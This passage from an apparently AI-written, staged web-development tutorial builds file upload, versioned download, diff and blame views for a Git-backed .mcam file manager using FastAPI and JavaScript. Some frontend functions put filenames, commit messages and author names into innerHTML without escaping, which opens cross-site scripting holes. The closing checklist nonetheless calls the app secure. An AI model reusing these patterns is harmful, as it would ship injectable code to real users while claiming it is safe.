        <p>📁 Click to select or drag and drop a .mcam file</p>
        <p class="upload-hint">Maximum file size: 10MB</p>
      </div>
      <div id="file-preview" class="file-preview hidden"></div>
    </div>
    <button type="submit" class="btn btn-primary" id="upload-btn" disabled>
      Upload File
    </button>
  </form>
</section>
```

### Upload CSS

Add to `style.css`:

```css
/* ============================================
   FILE UPLOAD
   ============================================ */

.upload-area {
  border: 2px dashed #667eea;
  border-radius: 8px;
  padding: 3rem 2rem;
  text-align: center;
  cursor: pointer;
  transition: all 0.3s ease;
  background: #f8f9ff;
}

.upload-area:hover {
  border-color: #764ba2;
  background: #f0f1ff;
}

.upload-area.drag-over {
  border-color: #28a745;
  background: #e8f5e9;
}

.upload-prompt p {
  margin: 0.5rem 0;
  color: #667eea;
  font-weight: 500;
}

.upload-hint {
  font-size: 0.9rem;
  color: #999;
}

.file-preview {
  margin-top: 1rem;
  padding: 1rem;
  background: white;
  border-radius: 4px;
  text-align: left;
}

.file-preview.hidden {
  display: none;
}

#upload-btn:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}
```

### Upload JavaScript

Add to `app.js`:

```javascript
document.addEventListener("DOMContentLoaded", function () {
  // ... existing code ...

  setupFileUpload();
});

function setupFileUpload() {
  const uploadArea = document.getElementById("upload-area");
  const fileInput = document.getElementById("file-input");
  const filePreview = document.getElementById("file-preview");
  const uploadBtn = document.getElementById("upload-btn");
  const uploadForm = document.getElementById("upload-form");

  // Click to select file
  uploadArea.addEventListener("click", () => {
    fileInput.click();
  });

  // File selected
  fileInput.addEventListener("change", (e) => {
    const file = e.target.files[0];
    if (file) {
      showFilePreview(file);
      uploadBtn.disabled = false;
    }
  });

  // Drag and drop
  uploadArea.addEventListener("dragover", (e) => {
    e.preventDefault();
    uploadArea.classList.add("drag-over");
  });

  uploadArea.addEventListener("dragleave", () => {
    uploadArea.classList.remove("drag-over");
  });

  uploadArea.addEventListener("drop", (e) => {
    e.preventDefault();
    uploadArea.classList.remove("drag-over");

    const file = e.dataTransfer.files[0];
    if (file && file.name.endsWith(".mcam")) {
      fileInput.files = e.dataTransfer.files;
      showFilePreview(file);
      uploadBtn.disabled = false;
    } else {
      showNotification("Please upload a .mcam file", "error");
    }
  });

  // Submit
  uploadForm.addEventListener("submit", async (e) => {
    e.preventDefault();
    await handleFileUpload();
  });
}

function showFilePreview(file) {
  const preview = document.getElementById("file-preview");
  preview.classList.remove("hidden");

  const sizeKB = (file.size / 1024).toFixed(2);
  preview.innerHTML = `
        <strong>Selected file:</strong> ${file.name}<br>
        <strong>Size:</strong> ${sizeKB} KB<br>
        <strong>Type:</strong> ${file.type || "application/octet-stream"}
    `;
}

async function handleFileUpload() {
  const fileInput = document.getElementById("file-input");
  const file = fileInput.files[0];

  if (!file) {
    showNotification("No file selected", "error");
    return;
  }

  const uploadBtn = document.getElementById("upload-btn");
  uploadBtn.disabled = true;
  uploadBtn.textContent = "Uploading...";

  try {
    const formData = new FormData();
    formData.append("file", file);

    const token = localStorage.getItem("access_token");

    const response = await fetch("/api/files/upload", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${token}`,
      },
      body: formData, // Don't set Content-Type - browser does it automatically
    });

    if (!response.ok) {
      const error = await response.json();
      throw new Error(error.detail || "Upload failed");
    }

    const data = await response.json();
    showNotification(data.message, "success");

    // Reset form
    fileInput.value = "";
    document.getElementById("file-preview").classList.add("hidden");
    uploadBtn.disabled = true;
    uploadBtn.textContent = "Upload File";

    // Reload file list
    loadFiles();
  } catch (error) {
    console.error("Upload error:", error);
    showNotification(error.message, "error");
    uploadBtn.disabled = false;
    uploadBtn.textContent = "Upload File";
  }
}
```

### Understanding Drag and Drop API

**The events:**

**`dragover`** - Fires continuously while dragging over element

```javascript
uploadArea.addEventListener("dragover", (e) => {
  e.preventDefault(); // Required! Default is to reject drops
  uploadArea.classList.add("drag-over");
});
```

**`dragleave`** - Fires when leaving the element

```javascript
uploadArea.addEventListener("dragleave", () => {
  uploadArea.classList.remove("drag-over");
});
```

**`drop`** - Fires when user releases the file

```javascript
uploadArea.addEventListener("drop", (e) => {
  e.preventDefault(); // Prevent browser from opening the file

  const file = e.dataTransfer.files[0]; // Get the dropped file
  // Handle the file...
});
```

**Why `e.preventDefault()`?**

Without it:

- `dragover` - Browser rejects the drop (cursor shows "not allowed")
- `drop` - Browser opens the file (navigates away from your app)

With it:

- You control what happens

---

## 8.2: File Download with Version Selection

### Download Latest Version

```python
@app.get("/api/files/{filename}/download")
def download_file(
    filename: str,
    commit_sha: str = None,
    current_user: User = Depends(get_current_user)
):
    """
    Download a file from the repository.

    Query parameters:
        commit_sha: Optional. Download from specific commit (defaults to latest)
    """
    logger.info(f"Download request: {filename} by {current_user.username}")

    safe_filename = os.path.basename(filename)

    try:
        if commit_sha:
            # Download from specific commit
            commit = git_repo.commit(commit_sha)

            # Get file content from that commit
            try:
                file_content = (commit.tree / 'repo' / safe_filename).data_stream.read()
            except KeyError:
                raise HTTPException(
                    status_code=404,
                    detail=f"File '{safe_filename}' not found in commit {commit_sha[:8]}"
                )
        else:
            # Download current version
            file_path = REPO_PATH / safe_filename

            if not file_path.exists():
                raise HTTPException(status_code=404, detail="File not found")

            with open(file_path, 'rb') as f:
                file_content = f.read()

        # Log the download
        log_audit_event(
            user=current_user.username,
            action="DOWNLOAD_FILE",
            target=safe_filename,
            details={"commit": commit_sha or "HEAD"}
        )

        # Return file as download
        return StreamingResponse(
            io.BytesIO(file_content),
            media_type='application/octet-stream',
            headers={
                'Content-Disposition': f'attachment; filename="{safe_filename}"'
            }
        )

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Download failed: {e}")
        raise HTTPException(status_code=500, detail="Download failed")
```

### Understanding Git Tree Navigation

```python
commit.tree / 'repo' / safe_filename
```

**What's happening:**

**`commit.tree`** - The root Tree object for this commit

```
Tree (root)
├── repo/
│   ├── PN1001.mcam (Blob)
│   └── PN1002.mcam (Blob)
├── locks.json (Blob)
└── users.json (Blob)
```

**`commit.tree / 'repo'`** - Navigate into the `repo` subdirectory (returns another Tree)

```
Tree (repo)
├── PN1001.mcam (Blob)
└── PN1002.mcam (Blob)
```

**`commit.tree / 'repo' / 'PN1001.mcam'`** - Get the Blob object

```
Blob (PN1001.mcam)
content: "G0 X0 Y0\nG1 X10..."
```

**`.data_stream.read()`** - Read the blob's content (bytes)

### Frontend: Download Button

Update `createFileElement()` in `app.js`:

```javascript
function createFileElement(file) {
  // ... existing code ...

  // Download button (always visible)
  const downloadBtn = document.createElement("button");
  downloadBtn.className = "btn btn-secondary";
  downloadBtn.textContent = "Download";
  downloadBtn.onclick = () => handleDownload(file.name);
  actionsDiv.appendChild(downloadBtn);

  // ... rest of code ...
}

async function handleDownload(filename) {
  const token = localStorage.getItem("access_token");

  try {
    const response = await fetch(`/api/files/${filename}/download`, {
      headers: {
        Authorization: `Bearer ${token}`,
      },
    });

    if (!response.ok) {
      throw new Error("Download failed");
    }

    // Create blob from response
    const blob = await response.blob();

    // Create download link
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();

    // Cleanup
    window.URL.revokeObjectURL(url);
    document.body.removeChild(a);

    showNotification(`Downloaded ${filename}`, "success");
  } catch (error) {
    console.error("Download error:", error);
    showNotification("Download failed", "error");
  }
}
```

### Understanding Blob URLs

```javascript
const url = window.URL.createObjectURL(blob);
// Result: "blob:http://localhost:8000/uuid-goes-here"
```

**What is a Blob URL?**

- Temporary URL that points to data in memory
- Created with `URL.createObjectURL()`
- Browser holds the data
- Can be used in `<a href>`, `<img src>`, etc.

**Why create a temporary `<a>` element?**

```javascript
const a = document.createElement("a");
a.href = url;
a.download = filename;
a.click();
```

- We need to trigger a download
- Setting `a.download` tells browser to download, not navigate
- `.click()` programmatically clicks the link
- User sees the save dialog

**Why cleanup?**

```javascript
window.URL.revokeObjectURL(url);
document.body.removeChild(a);
```

- Blob URLs consume memory
- Revoke to free memory
- Remove the hidden `<a>` element (we added it to DOM for `.click()` to work)

---

## 8.3: Diff Viewing - See What Changed

### What is a Diff?

A **diff** shows the differences between two versions of a file.

**Format:**

```diff
  Line that stayed the same
- Line that was removed
+ Line that was added
  Another unchanged line
```

**Example:**

```diff
  G0 X0 Y0
- G1 X10 Y10 F100
+ G1 X10 Y10 F200
  G0 Z5
```

This shows: Feed rate changed from F100 to F200.

### Unified Diff Format

**Standard diff output:**

```diff
--- a/file.txt
+++ b/file.txt
@@ -1,4 +1,4 @@
 Line 1
 Line 2
-Old line 3
+New line 3
 Line 4
```

**Breaking it down:**

**`--- a/file.txt`** - Original file (before)  
**`+++ b/file.txt`** - New file (after)

**`@@ -1,4 +1,4 @@`** - Hunk header

- `-1,4` - Starting at line 1 of original, showing 4 lines
- `+1,4` - Starting at line 1 of new, showing 4 lines

**Lines:**

- ` ` (space) - Unchanged
- `-` - Removed from original
- `+` - Added in new

### Get Diff Endpoint

```python
@app.get("/api/files/{filename}/diff")
def get_file_diff(
    filename: str,
    commit1: str,
    commit2: str = "HEAD",
    current_user: User = Depends(get_current_user)
):
    """
    Get diff between two commits for a file.

    Args:
        filename: File to compare
        commit1: Earlier commit (or 'HEAD~1' for previous)
        commit2: Later commit (default: HEAD = current)

    Returns:
        Unified diff output
    """
    logger.info(
        f"Diff request: {filename} between {commit1} and {commit2} "
        f"by {current_user.username}"
    )

    safe_filename = os.path.basename(filename)
    file_path = f'repo/{safe_filename}'

    try:
        # Resolve commit references
        c1 = git_repo.commit(commit1)
        c2 = git_repo.commit(commit2)

        # Get the diff
        diffs = c1.diff(c2, paths=file_path, create_patch=True)

        if not diffs:
            return {
                "filename": safe_filename,
                "commit1": c1.hexsha[:8],
                "commit2": c2.hexsha[:8],
                "diff": None,
                "message": "No changes between these commits"
            }

        diff_obj = diffs[0]

        return {
            "filename": safe_filename,
            "commit1": {
                "sha": c1.hexsha[:8],
                "message": c1.message.strip(),
                "author": c1.author.name,
                "date": c1.committed_datetime.isoformat()
            },
            "commit2": {
                "sha": c2.hexsha[:8],
                "message": c2.message.strip(),
                "author": c2.author.name,
                "date": c2.committed_datetime.isoformat()
            },
            "diff": diff_obj.diff.decode('utf-8'),
            "stats": {
                "insertions": diff_obj.diff.decode('utf-8').count('\n+'),
                "deletions": diff_obj.diff.decode('utf-8').count('\n-')
            }
        }

    except Exception as e:
        logger.error(f"Diff failed: {e}")
        raise HTTPException(status_code=500, detail=f"Failed to generate diff: {str(e)}")
```

### Understanding Git Commit References

```python
commit = git_repo.commit("HEAD")      # Current commit
commit = git_repo.commit("HEAD~1")    # Previous commit
commit = git_repo.commit("HEAD~2")    # Two commits ago
commit = git_repo.commit("abc123")    # Specific commit by SHA
commit = git_repo.commit("main")      # Tip of main branch
```

**Tilde (`~`) notation:**

- `HEAD~1` = Parent of HEAD
- `HEAD~2` = Grandparent of HEAD
- `HEAD~3` = Great-grandparent
- etc.

**Caret (`^`) notation:**

- `HEAD^` = Parent of HEAD (same as `HEAD~1`)
- `HEAD^2` = Second parent (in merge commits)

### Frontend: Diff Viewer

Add to `index.html`:

```html
<!-- Diff Modal -->
<div id="diff-modal" class="modal-overlay hidden">
  <div class="modal-content modal-large">
    <div class="modal-header">
      <h3>File Diff</h3>
      <button class="modal-close" aria-label="Close">&times;</button>
    </div>
    <div class="modal-body">
      <div id="diff-content">
        <p>Loading diff...</p>
      </div>
    </div>
  </div>
</div>
```

### Diff CSS

```css
.modal-large {
  max-width: 900px;
  width: 95%;
}

.diff-container {
  font-family: "Courier New", monospace;
  font-size: 0.9rem;
  background: #f8f9fa;
  padding: 1rem;
  border-radius: 4px;
  overflow-x: auto;
}

.diff-line {
  white-space: pre;
  padding: 0.1rem 0.5rem;
}

.diff-add {
  background: #d4edda;
  color: #155724;
}

.diff-remove {
  background: #f8d7da;
  color: #721c24;
}

.diff-context {
  color: #666;
}

.diff-header {
  color: #667eea;
  font-weight: bold;
  margin-top: 1rem;
}

.diff-stats {
  margin-bottom: 1rem;
  padding: 0.75rem;
  background: #e7f3ff;
  border-radius: 4px;
}

.diff-stats span {
  margin-right: 1.5rem;
}

.insertions {
  color: #28a745;
  font-weight: bold;
}

.deletions {
  color: #dc3545;
  font-weight: bold;
}
```

### Diff JavaScript

Add to `app.js`:

```javascript
const diffModal = new ModalManager("diff-modal");

async function showFileDiff(filename) {
  diffModal.open();

  const diffContent = document.getElementById("diff-content");
  diffContent.innerHTML = "<p>Loading diff...</p>";

  const token = localStorage.getItem("access_token");

  try {
    // Get diff between HEAD~1 and HEAD (latest change)
    const response = await fetch(
      `/api/files/${filename}/diff?commit1=HEAD~1&commit2=HEAD`,
      {
        headers: {
          Authorization: `Bearer ${token}`,
        },
      }
    );

    if (!response.ok) {
      throw new Error("Failed to load diff");
    }

    const data = await response.json();

    if (!data.diff) {
      diffContent.innerHTML = `
                <p>No changes found between commits.</p>
            `;
      return;
    }

    renderDiff(data);
  } catch (error) {
    console.error("Diff error:", error);
    diffContent.innerHTML = `
            <p class="error">Failed to load diff: ${error.message}</p>
        `;
  }
}

function renderDiff(data) {
  const diffContent = document.getElementById("diff-content");

  let html = `
        <div class="diff-stats">
            <strong>Changes:</strong>
            <span class="insertions">+${data.stats.insertions} additions</span>
            <span class="deletions">-${data.stats.deletions} deletions</span>
        </div>
        
        <p><strong>Comparing:</strong></p>
        <p>📝 ${data.commit1.sha}: ${data.commit1.message} (${data.commit1.author})</p>
        <p>📝 ${data.commit2.sha}: ${data.commit2.message} (${data.commit2.author})</p>
        
        <div class="diff-container">
    `;

  // Parse and display diff
  const lines = data.diff.split("\n");

  for (const line of lines) {
    let className = "diff-context";

    if (line.startsWith("+++") || line.startsWith("---")) {
      className = "diff-header";
    } else if (line.startsWith("+")) {
      className = "diff-add";
    } else if (line.startsWith("-")) {
      className = "diff-remove";
    } else if (line.startsWith("@@")) {
      className = "diff-header";
    }

    const escapedLine = line
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;");

    html += `<div class="${className}">${escapedLine}</div>`;
  }

  html += "</div>";
  diffContent.innerHTML = html;
}
```

### Add "View Diff" Button

Update `createFileElement()`:

```javascript
// View diff button
const diffBtn = document.createElement("button");
diffBtn.className = "btn btn-secondary";
diffBtn.textContent = "View Diff";
diffBtn.onclick = () => showFileDiff(file.name);
actionsDiv.appendChild(diffBtn);
```

---

## 8.4: Blame View - Line-by-Line Attribution

### What is Git Blame?

**Blame** shows who last modified each line of a file.

**Example output:**

```
abc123 (John Doe  2025-01-15) Line 1: G0 X0 Y0
abc123 (John Doe  2025-01-15) Line 2: G1 X10 Y10
def456 (Jane Smith 2025-02-20) Line 3: G1 X20 Y20
abc123 (John Doe  2025-01-15) Line 4: G0 Z5
```

**Use cases:**

- "Who wrote this line?"
- "When was this changed?"
- "Who do I ask about this code?"

### Blame Endpoint

```python
@app.get("/api/files/{filename}/blame")
def get_file_blame(
    filename: str,
    commit_sha: str = "HEAD",
    current_user: User = Depends(get_current_user)
):
    """
    Get blame (line-by-line attribution) for a file.

    Shows which commit last modified each line.
    """
    logger.info(f"Blame request: {filename} by {current_user.username}")

    safe_filename = os.path.basename(filename)
    file_path = f'repo/{safe_filename}'

    try:
        commit = git_repo.commit(commit_sha)

        # Run git blame
        blame_output = git_repo.blame(commit, file_path)

        # Parse blame output
        lines = []
        for commit_obj, line_content in blame_output:
            lines.append({
                "commit": {
                    "sha": commit_obj.hexsha[:8],
                    "author": commit_obj.author.name,
                    "date": commit_obj.committed_datetime.isoformat(),
                    "message": commit_obj.message.strip()
                },
                "content": line_content.decode('utf-8', errors='replace').rstrip()
            })

        return {
            "filename": safe_filename,
            "total_lines": len(lines),
            "lines": lines
        }

    except Exception as e:
        logger.error(f"Blame failed: {e}")
        raise HTTPException(status_code=500, detail=f"Failed to generate blame: {str(e)}")
```

### Understanding `git blame` Output

```python
blame_output = git_repo.blame(commit, file_path)
# Returns: List of tuples
# Each tuple: (Commit object, line content as bytes)
```

**Example:**

```python
[
    (Commit<abc123>, b"G0 X0 Y0\n"),
    (Commit<abc123>, b"G1 X10 Y10\n"),
    (Commit<def456>, b"G1 X20 Y20\n"),
]
```

### Blame Frontend

Add modal to `index.html`:

```html
<!-- Blame Modal -->
<div id="blame-modal" class="modal-overlay hidden">
  <div class="modal-content modal-large">
    <div class="modal-header">
      <h3>File Blame</h3>
      <button class="modal-close" aria-label="Close">&times;</button>
    </div>
    <div class="modal-body">
      <div id="blame-content">
        <p>Loading blame...</p>
      </div>
    </div>
  </div>
</div>
```

### Blame CSS

```css
.blame-container {
  font-family: "Courier New", monospace;
  font-size: 0.9rem;
  background: #f8f9fa;
  border-radius: 4px;
  overflow: auto;
}

.blame-line {
  display: flex;
  border-bottom: 1px solid #e0e0e0;
}

.blame-line:hover {
  background: #fff3cd;
}

.blame-info {
  padding: 0.5rem;
  min-width: 300px;
  background: #fff;
  border-right: 2px solid #667eea;
  font-size: 0.85rem;
}

.blame-commit {
  color: #667eea;
  font-weight: bold;
}

.blame-author {
  color: #666;
}

.blame-date {
  color: #999;
  font-size: 0.8rem;
}

.blame-content {
  padding: 0.5rem;
  flex: 1;
  white-space: pre;
}

.line-number {
  display: inline-block;
  width: 3rem;
  color: #999;
  text-align: right;
  margin-right: 1rem;
}
```

### Blame JavaScript

```javascript
const blameModal = new ModalManager("blame-modal");

async function showFileBlame(filename) {
  blameModal.open();

  const blameContent = document.getElementById("blame-content");
  blameContent.innerHTML = "<p>Loading blame...</p>";

  const token = localStorage.getItem("access_token");

  try {
    const response = await fetch(`/api/files/${filename}/blame`, {
      headers: {
        Authorization: `Bearer ${token}`,
      },
    });

    if (!response.ok) {
      throw new Error("Failed to load blame");
    }

    const data = await response.json();
    renderBlame(data);
  } catch (error) {
    console.error("Blame error:", error);
    blameContent.innerHTML = `
            <p class="error">Failed to load blame: ${error.message}</p>
        `;
  }
}

function renderBlame(data) {
  const blameContent = document.getElementById("blame-content");

  let html = `
        <p><strong>${data.filename}</strong> (${data.total_lines} lines)</p>
        <div class="blame-container">
    `;

  data.lines.forEach((line, index) => {
    const lineNum = index + 1;
    const date = new Date(line.commit.date).toLocaleDateString();

    html += `
            <div class="blame-line">
                <div class="blame-info">
                    <div class="blame-commit">${line.commit.sha}</div>
                    <div class="blame-author">${line.commit.author}</div>
                    <div class="blame-date">${date}</div>
                </div>
                <div class="blame-content">
                    <span class="line-number">${lineNum}</span>${escapeHtml(
      line.content
    )}
                </div>
            </div>
        `;
  });

  html += "</div>";
  blameContent.innerHTML = html;
}

function escapeHtml(text) {
  const div = document.createElement("div");
  div.textContent = text;
  return div.innerHTML;
}
```

### Add "Blame" Button

```javascript
// Blame button
const blameBtn = document.createElement("button");
blameBtn.className = "btn btn-secondary";
blameBtn.textContent = "Blame";
blameBtn.onclick = () => showFileBlame(file.name);
actionsDiv.appendChild(blameBtn);
```

---

## Stage 8 Complete - Advanced Git Mastery!

### What You Built

You now have:

- File upload with drag-and-drop
- File download (current and historical versions)
- Visual diff viewer
- Blame view (line-by-line attribution)
- Complete version history
- Professional Git workflow

### Key Concepts Mastered

**File Operations:**

- Multipart form uploads in FastAPI
- Filename sanitization (security)
- Drag-and-drop API
- Programmatic file downloads
- Blob URLs

**Git Deep Dive:**

- Tree navigation (`commit.tree / path`)
- Diff generation and parsing
- Blame (line attribution)
- Commit references (HEAD~1, etc.)
- Unified diff format

**Frontend Skills:**

- Drag-and-drop events
- File preview
- Diff syntax highlighting
- Modal dialogs
- Dynamic HTML generation

### Verification Checklist

- [ ] Can upload files via drag-and-drop or click
- [ ] Upload creates Git commit
- [ ] Can download current version
- [ ] Can download historical version
- [ ] Diff shows changes between commits
- [ ] Blame shows who wrote each line
- [ ] Understand unified diff format
- [ ] Understand Git tree structure
- [ ] Understand Blob URLs

### Security Best Practices Applied

✓ **File size limits** (prevent DoS)  
✓ **Extension validation** (only .mcam)  
✓ **Filename sanitization** (prevent directory traversal)  
✓ **Authentication required** (all operations)  
✓ **Audit logging** (upload/download tracked)

### The Complete Git Workflow

```
User uploads file
    ↓
Server validates
    ↓
Pull from GitLab (get latest)
    ↓
Write file to disk
    ↓
Stage in Git (git add)
    ↓
Commit with attribution
    ↓
Push to GitLab (backup)
    ↓
Done! (file is versioned and safe)
```

### What's Next?

In **Stage 9**, we'll add **real-time collaboration features**:

- WebSockets for live updates
- See who's currently editing
- Push notifications when files unlock
- Real-time file status updates
- Collaborative presence indicators

Your app is now a professional version control system. Next, we make it collaborative in real-time!

---

**Copy this into MkDocs. When ready, request Stage 9.**
